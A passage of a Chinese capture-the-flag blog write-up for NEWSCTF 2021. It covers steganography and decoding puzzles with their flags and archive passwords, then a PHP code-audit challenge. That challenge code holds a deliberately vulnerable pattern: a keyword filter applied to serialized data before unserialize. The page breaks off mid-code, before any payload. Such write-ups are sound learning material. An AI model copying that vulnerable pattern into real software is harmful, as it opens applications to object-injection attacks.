@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Miscmisc簽到處使用 010 editor 開啟檔案可在檔案尾部發現壓縮文件，同時因為其採用了僅儲存的方式壓縮，明文直接可見。  將其中內容提取出來得到如下資訊。 text1ZmxhZ3tXZWxjMG1lX3QwX25ld3NjdGYhISF9CuaUr+S7mOWuneWPo+S7pFvmrKLov47mnaXliLDokIzmlrDnvqTotZtd  使用 base64 解碼一次可得">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NEWSCTF 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/bf20b880.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="Miscmisc簽到處使用 010 editor 開啟檔案可在檔案尾部發現壓縮文件，同時因為其採用了僅儲存的方式壓縮，明文直接可見。  將其中內容提取出來得到如下資訊。 text1ZmxhZ3tXZWxjMG1lX3QwX25ld3NjdGYhISF9CuaUr+S7mOWuneWPo+S7pFvmrKLov47mnaXliLDokIzmlrDnvqTotZtd  使用 base64 解碼一次可得">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389839797742.687838a8cc4f591bebdc15dd3f7cb165d659f91e.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389839914728.bb97b168771845e7a5e02cee555a3463851e2ab2.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840083830.9bf60df5787e33f69dba1a451f8d5cc4d9e84690.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840127856.59ce54a045650316e88bc908aab282d30953f1c6.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840182034.6c446279d0c0b5260ecd81645cccfb7182534515.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840393034.9b5e65c8914c97ac0bf7cd6403898abcfc726b4b.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840458062.457b16b6ab875e57cbd5a1e56db671b24f02c9b0.jpg">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840528145.9960e7a59c3ebcd6de266c3f93b7b9a1249970fe.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840632036.4afbd50b288e48752b87c6964a3eb31c310645e8.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613390969937.ffc2453542232e936c0a73c520482e4c5fb9d370.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840704118.492a05330b9726d4ba5e73334344931332a72c88.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840803116.b7478abea371cdd6b0c031d4a0aca1044ba81892.jpg">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840877046.1278f7f0c140b5be95563c5c0cce593ef931354d.jpg">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840957266.1284facd764f73d598f86368962d7e171dbf79ae.jpg">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613393667083.f2265bcc80380afcfe97dcc12a911e0193065d59.png@125w.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389841035434.1f4c89da97f6005f6369a03bda02303e2934c8dc.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389841218491.5440a5f5020440ae151d6f63ebd9e6801ebcbe66.png">
+<meta property="article:published_time" content="2021-02-15T13:36:00.000Z">
+<meta property="article:modified_time" content="2021-04-28T08:29:09.309Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389839797742.687838a8cc4f591bebdc15dd3f7cb165d659f91e.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>NEWSCTF 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/bf20b880.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/484ca20c.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/bf20b880.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/bf20b880.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&text=NEWSCTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&is_video=false&description=NEWSCTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NEWSCTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/bf20b880.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&name=NEWSCTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&t=NEWSCTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#misc%E7%B0%BD%E5%88%B0%E8%99%95"><span class="toc-number">1.1.</span> <span class="toc-text">misc簽到處</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%BD%E8%A3%9D%E8%80%85"><span class="toc-number">1.2.</span> <span class="toc-text">偽裝者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%BD%E8%AA%AA%E4%BD%A0%E5%96%9C%E6%AD%A1%E8%96%85%E7%BE%8A%E6%AF%9B"><span class="toc-number">1.3.</span> <span class="toc-text">聽說你喜歡薅羊毛</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#happy-ox"><span class="toc-number">1.4.</span> <span class="toc-text">happy ox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EMOJI"><span class="toc-number">1.5.</span> <span class="toc-text">EMOJI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E6%96%A4%E5%B0%91%E5%85%A9"><span class="toc-number">1.6.</span> <span class="toc-text">缺斤少兩</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#girlfriend"><span class="toc-number">2.1.</span> <span class="toc-text">girlfriend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ%E5%A5%97%E5%A8%83"><span class="toc-number">2.2.</span> <span class="toc-text">EZ套娃</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        NEWSCTF 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-02-15T13:36:00.000Z" itemprop="datePublished">2021-02-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="misc簽到處"><a href="#misc簽到處" class="headerlink" title="misc簽到處"></a>misc簽到處</h3><p>使用 010 editor 開啟檔案可在檔案尾部發現壓縮文件，同時因為其採用了僅儲存的方式壓縮，明文直接可見。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389839797742.687838a8cc4f591bebdc15dd3f7cb165d659f91e.png"></p>
+<p>將其中內容提取出來得到如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tXZWxjMG1lX3QwX25ld3NjdGYhISF9CuaUr+S7mOWuneWPo+S7pFvmrKLov47mnaXliLDokIzmlrDnvqTotZtd</span><br></pre></td></tr></table></figure>
+
+<p>使用 base64 解碼一次可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_t0_newsctf!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="偽裝者"><a href="#偽裝者" class="headerlink" title="偽裝者"></a>偽裝者</h3><p>修正附件壓縮包檔案頭為 <code>Rar!</code>，解壓附件得到一張圖片，用 010 editor 開啟可發現 CRC Mismatch 的報錯，使用指令碼爆破得寬高為 1297x1065，修正後可得如下圖片。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389839914728.bb97b168771845e7a5e02cee555a3463851e2ab2.png"></p>
+<p>根據背景中的描述可知附件中解壓所得的壓縮包 niu.zip 的密碼為劇中的“王天風”，轉換成漢語拼音後即 <code>wangtianfeng</code>。將其作為壓縮包密碼解壓 niu.zip 可得一張圖片。</p>
+<p>在附件中解壓所得的 key.wav 的末尾可聽到一段 DTMF，將其提取出來後波形和頻率如下圖。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840083830.9bf60df5787e33f69dba1a451f8d5cc4d9e84690.png"></p>
+<p>使用工具對照著解碼再對照 T9 鍵盤轉譯可得如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#222833344477773338866#</span><br><span class="line">ctfisfun</span><br></pre></td></tr></table></figure>
+
+<p>將其作為密碼對 niu.jpg 使用 steghide 提取資訊可得如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf niu.jpg -p ctfisfun -xf extract.txt</span><br><span class="line">熊曰：呋食很誒咯噔破啽住有歡嗚註嗄和你吃冬註物物眠嗚笨嘍擊笨噤襲你爾咬你爾常破很歡我吖拙歡意擊咯堅有嗷嗥哞怎發唬肉既歡沒破噤咯人和嘶啽更</span><br></pre></td></tr></table></figure>
+
+<p>將所得資訊使用熊曰解密即可得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840127856.59ce54a045650316e88bc908aab282d30953f1c6.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;牛年大吉今晚吃雞今晚吃雞小年快樂happy&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="聽說你喜歡薅羊毛"><a href="#聽說你喜歡薅羊毛" class="headerlink" title="聽說你喜歡薅羊毛"></a>聽說你喜歡薅羊毛</h3><p>解壓附件後得到羊毛.jpg，在檔案尾部可以發現如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011110000010010100101011001110100010001101000100101001101000011010011010010001111010001110011010100010111010000011110100000000110111000000000110100110011000000001110</span><br></pre></td></tr></table></figure>
+
+<p>將其使用培根密碼解密之後可得如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwordistingshuonixihuanyangmao</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>tingshuonixihuanyangmao</code> 對羊毛.jpg 執行 outguess 可以得到 brainpower 的壓縮包密碼 <code>Wdn1His87</code>。將壓縮包解壓後得到一個文字文件，file 一下可知是音訊檔案。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840182034.6c446279d0c0b5260ecd81645cccfb7182534515.png"></p>
+<p>修正拓展名為 mp3 後使用 Audition 可以發現如下資訊。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840393034.9b5e65c8914c97ac0bf7cd6403898abcfc726b4b.png"></p>
+<p>使用 <code>PsWdMuzi123</code> 作為壓縮包密碼解壓 flag.zip 可以得到一個 flag.txt。其中的內容經過倒序後再十六進位制到十進位制轉化一次可得一張圖片檔案。將檔案頭修正回 JPG 的檔案頭 <code>FF D8 FF E0 00 10 4A 46 49 46</code> 即可得到如下二維碼。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840458062.457b16b6ab875e57cbd5a1e56db671b24f02c9b0.jpg"></p>
+<p>掃描二維碼可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;s0_easy_is_not_it?&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="happy-ox"><a href="#happy-ox" class="headerlink" title="happy ox"></a>happy ox</h3><p>解壓附件可以得到牛爺爺祝大家牛年行大運.png。使用 stegsolve 可解出 flag in it.zip 的壓縮包密碼為 <code>niuniandaji888</code>。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840528145.9960e7a59c3ebcd6de266c3f93b7b9a1249970fe.png"></p>
+<p>將 flag in it.zip 解壓可得到一個 Word 文件，其中有一張圖片。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840632036.4afbd50b288e48752b87c6964a3eb31c310645e8.png"> </p>
+<p>將 Word 文件開啟後根據其中內容可知棋盤上所用密碼為科比密碼。使用如下密碼錶對照解密。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613390969937.ffc2453542232e936c0a73c520482e4c5fb9d370.png"></p>
+<p>可以得到如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PASSWDISKBYYDSEZ</span><br></pre></td></tr></table></figure>
+
+<p>以 kbyydsez 為壓縮包密碼解壓 flag.zip 可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0h_y0u_f1nd_Me_h3ck&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="EMOJI"><a href="#EMOJI" class="headerlink" title="EMOJI"></a>EMOJI</h3><blockquote>
+<p>Reference: <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/332742614/answer/737382212">https://www.zhihu.com/question/332742614/answer/737382212</a></p>
+</blockquote>
+<p>修復 rar 附件的檔案頭 <code>Rar!</code>，可以解壓出一張圖片。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840704118.492a05330b9726d4ba5e73334344931332a72c88.png"></p>
+<p>此圖是根據《長安十二時辰》中的望樓傳信編制的，個十百位解碼圖如下。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840803116.b7478abea371cdd6b0c031d4a0aca1044ba81892.jpg"></p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840877046.1278f7f0c140b5be95563c5c0cce593ef931354d.jpg"></p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840957266.1284facd764f73d598f86368962d7e171dbf79ae.jpg"></p>
+<p>對照上面三圖可以將題目中所給算式轉換出來。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">799 * 248 + 21</span><br></pre></td></tr></table></figure>
+
+<p>算出結果為 198173，則壓縮包密碼根據提示可知是 <code>一九八一七三</code>。解壓之後得到文字資訊如下。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key:sixgod</span><br><span class="line">ciphertext:🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🍌✅🚨📂📮🕹🎅🥋🌉😍🚪🤣🐅👑☂😀🦓⏩😍🌏🎅🌿🐘💵🍵☀✉🍍🌪🚫💵🍍🏎👣💵🔪🍌✉🐘😂🚨☂📮🔪💵🏹👉🐎🔬🌪🍎ℹ😊🚨😂🍵🍵😊🚨🔪✖🎈☺🦓🚰☃🌏🚪👣🍍✉👌🔄✉💧🗒🗒</span><br></pre></td></tr></table></figure>
+
+<p>使用<a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/"> emoji-aes 線上加解密工具</a>解密即可得出 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;em0j1_Aes_1s_3_ni5e_3ncr9pt_to0l&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="缺斤少兩"><a href="#缺斤少兩" class="headerlink" title="缺斤少兩"></a>缺斤少兩</h3><p>解壓附件可得兩張圖片，掃描 <code>諧音梗，扣錢！.png</code> 可得如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大牛：我也很疑惑呢</span><br></pre></td></tr></table></figure>
+
+<p>password.png 的二維碼很明顯缺少了一部分，根據諧音梗推測需要異或圖片。於是將上述兩張圖片異或後得到如下圖片。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613393667083.f2265bcc80380afcfe97dcc12a911e0193065d59.png@125w.png"></p>
+<p>將圖片反色並修正定位點後掃描可得如下內容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password:1q2w3e4r5t6y7u8i</span><br></pre></td></tr></table></figure>
+
+<p>將其作為壓縮包密碼解壓 flag+2.zip。根據得到的 hint.txt 中的提示 <code>密碼是靠猜的，不是爆破！</code> 可知 passwd.jpg 中藏有隱寫。使用 outguess 可以解出其中內容為 <code>news52ctf0</code>。在 <code>喵嗚.jpg</code> 中可分理出一個壓縮包。（到這一步我沒法用上面得到的密碼來解壓出壓縮包了，於是看了 WriteUp 接著往下寫）</p>
+<p>換表的 base64 編碼，簡單篩選出問號可能的字元 <code>ju34=</code>，排列組合一下可以得到正確結果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lemonprefect.cn&#x2F;cb&#x2F;#recipe&#x3D;From_Base64(&#39;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs34ujkxyz012789%2B&#x2F;&#39;,true)&amp;input&#x3D;bXRIVm5rTG5JYVAzRmFBN0tPV2pUbUtrVmpXalZ6S2pkZU52VG5Bam9IOWlaT0l2VGVIYnZEPT0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEWSCTF2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>程式碼審計的題目，給出的程式碼如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$payload</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;boyfriend&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$key</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;hack!!!!&#x27;</span>,<span class="variable">$payload</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line"><span class="variable">$GDUT</span>[<span class="string">&#x27;A&amp;D&#x27;</span>]=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line"><span class="variable">$GDUT</span>[<span class="string">&#x27;Hed9eh0g&#x27;</span>]=<span class="string">&#x27;no_girlfriend&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>, <span class="string">&#x27;php&#x27;</span>)===<span class="literal">false</span>  &amp;&amp; strpos(<span class="variable">$payload</span>, <span class="string">&#x27;flag&#x27;</span>)===<span class="literal">false</span> &amp;&amp; strpos(<span class="variable">$payload</span>, <span class="string">&#x27;boyfriend&#x27;</span>)===<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;fuck_no_key!!!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$GDUT</span>[<span class="string">&#x27;A&amp;D&#x27;</span>]=<span class="variable">$payload</span>;</span><br><span class="line">        <span class="variable">$GDUT</span>=unserialize(filter(serialize(<span class="variable">$GDUT</span>)));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$GDUT</span>[<span class="string">&#x27;Hed9eh0g&#x27;</span>] === <span class="string">&#x27;has_girlfriend&#x27;</span>) 